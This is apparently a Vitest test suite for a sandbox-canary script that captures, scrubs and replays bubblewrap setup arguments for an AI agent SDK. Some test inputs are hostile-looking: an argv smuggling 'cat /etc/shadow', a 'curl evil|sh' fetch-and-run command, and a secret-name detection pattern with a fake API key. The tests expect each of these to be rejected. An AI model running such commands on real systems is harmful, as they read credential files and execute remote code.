import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// PR2 (#5875 item 1) — faithful sandbox canary, REPLAY-side logic (deploy-time).
// Per ADR-079 the deploy-time canary is creds-free/network-free/deterministic:
// it replays the SDK-captured bwrap SETUP argv inside the running canary
// container and classifies the exit. These are the pure, LLM-free assertions
// (the plan's "no LLM in the assertion path" requirement) — the model-turn
// CAPTURE path is exercised only by PR3's CI gate.
import {
  argvSecretRejection,
  assessCaptureOutcome,
  buildBwrapInvocation,
  CANARY_EMPTY_PLACEHOLDER,
  CANARY_WS_PLACEHOLDER,
  classifyReplayVerdict,
  computeCanaryPaths,
  normalizeCapturedArgv,
  parseShimSetupArgv,
  selectSandboxSetupArgv,
  sortDenyPaths,
  substituteCanonicalArgv,
  validateFixture,
} from "../scripts/sandbox-canary.mjs";

const MJS_PATH = fileURLToPath(
  new URL("../scripts/sandbox-canary.mjs", import.meta.url),
);

describe("classifyReplayVerdict — exit-code classification (false-rollback prevention)", () => {
  it("bwrap exit 0 ⇒ pass", () => {
    expect(classifyReplayVerdict({ bwrapExitCode: 0, bwrapStderr: "" })).toEqual({
      verdict: "pass",
      reason: "ok",
    });
  });

  it('bwrap stderr "Operation not permitted" ⇒ sandbox_broken (the #5873 shape)', () => {
    const v = classifyReplayVerdict({
      bwrapExitCode: 1,
      bwrapStderr:
        "bwrap: setting up uid map: Operation not permitted",
    });
    expect(v.verdict).toBe("sandbox_broken");
  });

  it("bwrap spawn ENOENT ⇒ canary_infra_error (do NOT roll back)", () => {
    const v = classifyReplayVerdict({
      bwrapExitCode: null,
      bwrapStderr: "",
      spawnErrorCode: "ENOENT",
    });
    expect(v.verdict).toBe("canary_infra_error");
  });

  it("ambiguous non-zero bwrap exit (no EPERM signature) ⇒ canary_infra_error, not sandbox_broken", () => {
    // Conservative: only a bwrap EPERM signature rolls back once blocking.
    // Any other non-zero (OOM, transient, unknown) must NOT be read as a
    // broken sandbox — that is the #4941 false-rollback class.
    const v = classifyReplayVerdict({
      bwrapExitCode: 137,
      bwrapStderr: "Killed",
    });
    expect(v.verdict).toBe("canary_infra_error");
  });
});

describe("validateFixture — captured-argv fixture contract", () => {
  it('uncaptured sentinel ⇒ status "uncaptured" (dark-launch before PR3 capture)', () => {
    const f = validateFixture({ status: "uncaptured" });
    expect(f.status).toBe("uncaptured");
  });

  it("valid captured fixture returns setup argv + prepDirs", () => {
    const f = validateFixture({
      sdkVersion: "0.3.197",
      sdkPackage: "@anthropic-ai/claude-agent-sdk",
      workspacePath: "/workspaces/.sandbox-canary",
      prepDirs: ["/workspaces/.sandbox-canary"],
      bwrapSetupArgv: ["--new-session", "--unshare-user", "--unshare-pid"],
    });
    expect(f.status).toBe("captured");
    expect(f.bwrapSetupArgv).toEqual([
      "--new-session",
      "--unshare-user",
      "--unshare-pid",
    ]);
    expect(f.prepDirs).toEqual(["/workspaces/.sandbox-canary"]);
  });

  it("malformed fixture (bwrapSetupArgv not an array) throws", () => {
    expect(() =>
      validateFixture({ bwrapSetupArgv: "not-an-array" }),
    ).toThrow();
  });

  it("empty captured argv is rejected (empty-green guard)", () => {
    // An empty argv fixture would make bwrap succeed trivially — the
    // empty-fixture false-green class the CTO flagged (constraint #6).
    expect(() =>
      validateFixture({ bwrapSetupArgv: [], prepDirs: [] }),
    ).toThrow();
  });
});

describe("buildBwrapInvocation — replays SETUP argv + '-- true' only", () => {
  it("appends the '-- true' no-op command, never a captured command", () => {
    const { cmd, args } = buildBwrapInvocation({
      status: "captured",
      bwrapSetupArgv: ["--new-session", "--unshare-user"],
      prepDirs: ["/workspaces/.sandbox-canary"],
    });
    expect(cmd).toBe("bwrap");
    expect(args).toEqual(["--new-session", "--unshare-user", "--", "true"]);
  });

  it("rejects a fixture whose setup argv already contains a bare '--' separator (defensive)", () => {
    expect(() =>
      buildBwrapInvocation({
        status: "captured",
        bwrapSetupArgv: ["--new-session", "--", "cat", "/etc/shadow"],
        prepDirs: [],
      }),
    ).toThrow();
  });

  it("rejects a fixture whose argv[0] is a bare command, not a bwrap option (sanity filter)", () => {
    // bwrap treats the first non-option token as the COMMAND — a real setup
    // argv always begins with an option. This is a cheap filter, not the
    // security boundary (that is the committed + baked + --verify fixture path).
    expect(() =>
      buildBwrapInvocation({
        status: "captured",
        bwrapSetupArgv: ["/bin/sh", "-c", "curl evil|sh"],
        prepDirs: [],
      }),
    ).toThrow();
  });
});

describe("sortDenyPaths — capture determinism (byte-stable fixture)", () => {
  it("returns a deterministically sorted copy (readdir order is not stable)", () => {
    const input = ["/workspaces/z", "/workspaces/a", "/proc"];
    expect(sortDenyPaths(input)).toEqual(["/proc", "/workspaces/a", "/workspaces/z"]);
    // does not mutate input
    expect(input).toEqual(["/workspaces/z", "/workspaces/a", "/proc"]);
  });
});

// ---------------------------------------------------------------------------
// PR3 (#5913 / ADR-079 deferral B) — CAPTURE-side pure logic (LLM-free).
// The model turn only decides WHETHER the SDK builds+spawns bwrap; these pure
// functions decide what the fixture asserts, so the LLM stays out of the
// assertion path (learning 2026-04-19-llm-sdk-security-tests-need-deterministic).
// ---------------------------------------------------------------------------

describe("parseShimSetupArgv — split the shim argv at the first '--'", () => {
  it("returns the prefix before the first '--' (the bwrap SETUP argv)", () => {
    expect(
      parseShimSetupArgv([
        "--new-session",
        "--unshare-user",
        "--unshare-pid",
        "--",
        "true",
      ]),
    ).toEqual(["--new-session", "--unshare-user", "--unshare-pid"]);
  });

  it("splits at the FIRST '--' only (a later '--' stays in the command tail)", () => {
    expect(
      parseShimSetupArgv(["--new-session", "--", "sh", "-c", "echo --"]),
    ).toEqual(["--new-session"]);
  });

  it("returns the whole argv when there is no '--' separator", () => {
    expect(parseShimSetupArgv(["--new-session", "--unshare-user"])).toEqual([
      "--new-session",
      "--unshare-user",
    ]);
  });

  it("returns an empty array when '--' is first (no setup options)", () => {
    expect(parseShimSetupArgv(["--", "true"])).toEqual([]);
  });
});

describe("computeCanaryPaths — pure, IO-free, deterministic zero-sibling path set", () => {
  it("maps a fixed base to a stable {root, ownWorkspacePath, prepDirs} set", () => {
    const a = computeCanaryPaths("/fixed/base");
    const b = computeCanaryPaths("/fixed/base");
    // Byte-identical across calls (no mktemp randomness) — the property that
    // makes the captured argv byte-reproducible for --verify.
    expect(a).toEqual(b);
    expect(a.root).toBe("/fixed/base/soleur-sandbox-canary");
    expect(a.ownWorkspacePath.startsWith(a.root + "/")).toBe(true);
    // The own workspace is the ONLY entry under root (zero siblings) so
    // enumerateSiblingDenyPaths returns just ["/proc"].
    expect(a.prepDirs).toContain(a.ownWorkspacePath);
  });

  it("does not touch the filesystem (pure) — an absent base still returns paths", () => {
    // A path under a directory that does not exist must not throw (no realpath,
    // no mkdir in the pure tier).
    const p = computeCanaryPaths("/nonexistent-canary-base-xyz");
    expect(p.ownWorkspacePath).toContain("/nonexistent-canary-base-xyz/");
  });
});

describe("selectSandboxSetupArgv — pick the --unshare-user spawn among multiple", () => {
  it("selects the invocation carrying --unshare-user (the sandbox SETUP spawn)", () => {
    const invocations = [
      ["--version"], // an SDK probe spawn, no userns
      ["--new-session", "--unshare-user", "--unshare-pid"],
    ];
    expect(selectSandboxSetupArgv(invocations)).toEqual([
      "--new-session",
      "--unshare-user",
      "--unshare-pid",
    ]);
  });

  it("returns the single invocation when only one was recorded", () => {
    expect(
      selectSandboxSetupArgv([["--new-session", "--unshare-user"]]),
    ).toEqual(["--new-session", "--unshare-user"]);
  });

  it("returns null when no invocation carries --unshare-user", () => {
    expect(selectSandboxSetupArgv([["--version"], ["--help"]])).toBeNull();
  });

  it("returns null when no invocations were recorded", () => {
    expect(selectSandboxSetupArgv([])).toBeNull();
  });
});

describe("assessCaptureOutcome — LLM-free retry-loop decision", () => {
  it("captured=true for a valid non-empty --unshare-* argv", () => {
    const r = assessCaptureOutcome({
      captureFilePresent: true,
      setupArgv: ["--new-session", "--unshare-user", "--unshare-pid"],
    });
    expect(r.captured).toBe(true);
  });

  it("captured=false (no_tool_call) when the shim never recorded a bwrap spawn", () => {
    const r = assessCaptureOutcome({ captureFilePresent: false, setupArgv: null });
    expect(r.captured).toBe(false);
    expect(r.reason).toBe("capture_no_bwrap:no_tool_call");
  });

  it("captured=false when the argv is present but carries no --unshare-* token", () => {
    const r = assessCaptureOutcome({
      captureFilePresent: true,
      setupArgv: ["--new-session", "--die-with-parent"],
    });
    expect(r.captured).toBe(false);
    expect(r.reason).toContain("capture_no_bwrap");
  });

  it("captured=false for an empty argv (reuses validateFixture's empty-green guard)", () => {
    const r = assessCaptureOutcome({ captureFilePresent: true, setupArgv: [] });
    expect(r.captured).toBe(false);
  });

  it("captured=false when a token is not a string", () => {
    const r = assessCaptureOutcome({
      captureFilePresent: true,
      setupArgv: ["--unshare-user", 42],
    });
    expect(r.captured).toBe(false);
  });
});

describe("argvSecretRejection — secret-scrub before writing the image-baked fixture", () => {
  // Split across concatenation so no contiguous `sk-ant-oat01-…`-shaped literal
  // exists in source (avoids tripping gitleaks / GitHub push protection —
  // cq-test-fixtures-synthesized-only + the split-fixture learning). The runtime
  // value keeps the redactor-matching shape.
  const KEY = "sk-ant-" + "oat01-" + "NOTAREALKEY000000000000";

  it("returns null (accept) for a clean setup argv", () => {
    expect(
      argvSecretRejection(
        ["--new-session", "--unshare-user", "--setenv", "PATH", "/usr/bin"],
        KEY,
      ),
    ).toBeNull();
  });

  it("rejects when a token contains the literal API key value", () => {
    expect(
      argvSecretRejection(
        ["--new-session", `--setenv`, "FOO", `prefix-${KEY}-suffix`],
        KEY,
      ),
    ).not.toBeNull();
  });

  it("rejects a --setenv whose NAME matches /KEY|TOKEN|SECRET|PASSWORD/i", () => {
    expect(
      argvSecretRejection(
        ["--unshare-user", "--setenv", "ANTHROPIC_API_KEY", "whatever"],
        KEY,
      ),
    ).not.toBeNull();
    expect(
      argvSecretRejection(
        ["--unshare-user", "--setenv", "github_token", "x"],
        KEY,
      ),
    ).not.toBeNull();
  });

  it("does not reject a benign --setenv NAME (PATH, HOME, LANG)", () => {
    expect(
      argvSecretRejection(
        ["--setenv", "PATH", "/usr/bin", "--setenv", "HOME", "/root"],
        KEY,
      ),
    ).toBeNull();
  });

  it("tolerates an empty/undefined key value (no literal match), still checks NAME", () => {
    expect(argvSecretRejection(["--setenv", "PATH", "/usr/bin"], "")).toBeNull();
    expect(
      argvSecretRejection(["--setenv", "MY_SECRET", "x"], ""),
    ).not.toBeNull();
  });

  it("checkSetenvNames:false skips the NAME rule (raw-argv pass), still catches literal VALUE", () => {
    // The SDK always forwards a benign secret-shaped env var (CLOUDSDK_PROXY_PASSWORD)
    // that projection DROPS — rejecting on it in the RAW argv would block every
    // capture. The raw pass checks only the literal secret value.
    expect(
      argvSecretRejection(
        ["--setenv", "CLOUDSDK_PROXY_PASSWORD", ""],
        KEY,
        { checkSetenvNames: false },
      ),
    ).toBeNull();
    expect(
      argvSecretRejection(
        ["--setenv", "FOO", KEY],
        KEY,
        { checkSetenvNames: false },
      ),
    ).not.toBeNull();
  });
});

describe("normalizeCapturedArgv — canonical projection (ADR-079 amend / CTO Option A)", () => {
  const WS = "/tmp/soleur-sandbox-canary/00000000-0000-4000-8000-0000000000ca";
  // A faithful slice of the real 0.3.197 SDK argv (empirically captured #5913).
  const RAW = [
    "--new-session",
    "--die-with-parent",
    "--unshare-net",
    "--bind",
    "/tmp/claude-http-4d00bdd60f15d924.sock",
    "/tmp/claude-http-4d00bdd60f15d924.sock",
    "--setenv",
    "CLOUDSDK_PROXY_PASSWORD",
    "secretval",
    "--setenv",
    "PATH",
    "/usr/bin",
    "--ro-bind",
    "/",
    "/",
    "--bind",
    "/home/jean/.npm/_logs",
    "/home/jean/.npm/_logs",
    "--bind",
    WS,
    WS,
    "--tmpfs",
    "/proc",
    "--ro-bind",
    "/tmp/claude-empty-Lrt1F7",
    `${WS}/.claude`,
    "--ro-bind",
    "/dev/null",
    `${WS}/.gitconfig`,
    "--dev",
    "/dev",
    "--unshare-pid",
    "--unshare-user",
    "--bind",
    "/proc",
    "/proc",
  ];

  it("drops all --setenv (env-forwarding, secret-shaped names) and counts them", () => {
    const { bwrapSetupArgv, dropped } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(bwrapSetupArgv).not.toContain("--setenv");
    expect(bwrapSetupArgv).not.toContain("CLOUDSDK_PROXY_PASSWORD");
    expect(dropped.setenv).toBe(2);
  });

  it("drops the random proxy socket bind and the host-specific bind", () => {
    const { bwrapSetupArgv, dropped } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(bwrapSetupArgv.join(" ")).not.toContain("claude-http-");
    expect(bwrapSetupArgv.join(" ")).not.toContain("/home/jean/.npm");
    expect(dropped.randomSocket).toBe(1);
    expect(dropped.hostBind).toBe(1);
  });

  it("normalizes the ws root to ${CANARY_WS} and the random-empty src to ${CANARY_EMPTY}", () => {
    const { bwrapSetupArgv, dropped } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    // own-workspace bind normalized
    expect(bwrapSetupArgv).toContain(CANARY_WS_PLACEHOLDER);
    expect(bwrapSetupArgv.join(" ")).toContain(`${CANARY_WS_PLACEHOLDER}/.claude`);
    // random empty src normalized to the placeholder, deterministic dst kept
    expect(bwrapSetupArgv).toContain(CANARY_EMPTY_PLACEHOLDER);
    expect(bwrapSetupArgv.join(" ")).not.toContain("claude-empty-");
    expect(dropped.randomEmptyDirBind).toBe(1);
  });

  it("keeps the full --unshare-* multiset (the #5849 split-unshare discriminator)", () => {
    const { bwrapSetupArgv } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(bwrapSetupArgv).toContain("--unshare-user");
    expect(bwrapSetupArgv).toContain("--unshare-pid");
    expect(bwrapSetupArgv).toContain("--unshare-net");
  });

  it("keeps deterministic-const binds (/, /dev/null, /proc) and structural flags", () => {
    const { bwrapSetupArgv } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    const s = bwrapSetupArgv.join(" ");
    expect(s).toContain("--ro-bind / /");
    expect(s).toContain(`--ro-bind /dev/null ${CANARY_WS_PLACEHOLDER}/.gitconfig`);
    expect(s).toContain("--bind /proc /proc");
    expect(s).toContain("--tmpfs /proc");
    expect(s).toContain("--dev /dev");
    expect(bwrapSetupArgv[0]).toBe("--new-session");
  });

  it("is byte-deterministic: two projections of the same raw argv are identical", () => {
    const a = normalizeCapturedArgv(RAW, { wsRoot: WS });
    const b = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(a.bwrapSetupArgv).toEqual(b.bwrapSetupArgv);
    expect(a.prepDirs).toEqual(b.prepDirs);
  });

  it("prepDirs are placeholder dirs to mkdir at replay (ws root + empty dir)", () => {
    const { prepDirs } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(prepDirs).toContain(CANARY_WS_PLACEHOLDER);
    expect(prepDirs).toContain(CANARY_EMPTY_PLACEHOLDER);
  });

  it("throws on an unrecognized bwrap option (SDK argv shape changed → fail loud)", () => {
    expect(() =>
      normalizeCapturedArgv(["--new-session", "--frobnicate", "x"], { wsRoot: WS }),
    ).toThrow(/unrecognized/i);
  });

  it("produces an argv buildBwrapInvocation accepts after substitution", () => {
    const { bwrapSetupArgv, prepDirs } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    const sub = substituteCanonicalArgv(bwrapSetupArgv, {
      ws: "/replay/ws",
      empty: "/replay/empty",
    });
    // no placeholder survives substitution
    expect(sub.join(" ")).not.toContain("${CANARY");
    const { cmd, args } = buildBwrapInvocation({
      status: "captured",
      bwrapSetupArgv: sub,
      prepDirs,
    });
    expect(cmd).toBe("bwrap");
    expect(args[args.length - 1]).toBe("true");
  });
});

describe("substituteCanonicalArgv — replay-time placeholder substitution", () => {
  it("replaces ${CANARY_WS} and ${CANARY_EMPTY} in every token", () => {
    const out = substituteCanonicalArgv(
      ["--bind", CANARY_WS_PLACEHOLDER, `${CANARY_WS_PLACEHOLDER}/.claude`, "--ro-bind", CANARY_EMPTY_PLACEHOLDER, `${CANARY_WS_PLACEHOLDER}/x`],
      { ws: "/w", empty: "/e" },
    );
    expect(out).toEqual(["--bind", "/w", "/w/.claude", "--ro-bind", "/e", "/w/x"]);
  });
});

describe("source contract — imports the SDK config, does not re-specify options", () => {
  const src = readFileSync(MJS_PATH, "utf8");

  it("references buildAgentSandboxConfig from agent-runner-sandbox-config (capture faithfulness)", () => {
    expect(src).toMatch(/agent-runner-sandbox-config/);
    expect(src).toMatch(/buildAgentSandboxConfig/);
  });

  it("imports the SDK config LAZILY (dynamic import) so the replay path stays pure", () => {
    // A top-level static import would drag the config's heavy static graph
    // (logger, etc.) into the creds-free replay path. The config import must
    // live inside the capture function via `await import(...)`.
    expect(src).toMatch(/await import\(/);
    expect(src).not.toMatch(
      /^import\s+\{[^}]*buildAgentSandboxConfig[^}]*\}\s+from/m,
    );
  });

  it("does not hand-author a bwrap argv literal (the #4932 trap)", () => {
    // The setup argv must come from the captured fixture, never a literal in
    // the script. Guard against a re-introduced hand-rolled `--unshare-*` list.
    expect(src).not.toMatch(/const\s+\w*[Aa]rgv\w*\s*=\s*\[\s*["']--unshare/);
  });
});
